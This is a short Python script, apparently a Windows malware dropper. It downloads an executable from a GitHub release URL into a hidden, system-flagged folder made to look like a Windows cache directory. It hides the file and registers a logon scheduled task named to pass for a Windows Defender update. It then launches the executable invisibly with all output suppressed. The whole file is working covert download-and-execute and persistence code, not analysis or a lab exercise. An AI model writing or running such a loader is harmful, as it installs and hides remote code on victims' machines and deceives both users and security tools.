import os
import subprocess
import urllib.request
from pathlib import Path

URL_UPDATE_EXE = "https://github.com/zzlasdf/update/releases/download/update/update.exe"

DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")

def descargar_update():
    try:
        if not os.path.exists(DIRECTORIO_DISCRETO):
            os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)

            subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        headers = {"User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request(URL_UPDATE_EXE, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response, open(RUTA_EXE_FINAL, 'wb') as out_file:
            while True:
                chunk = response.read(16384)
                if not chunk:
                    break
                out_file.write(chunk)

        subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def configurar_tarea_silenciosa():

    nombre_tarea = "WindowDefenderUpdateTask"

    comando = (
        f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
        f'/tr "\"{RUTA_EXE_FINAL}\"" /f'
    )
    
    try:

        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

if __name__ == "__main__":

    if descargar_update():

        configurar_tarea_silenciosa()

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
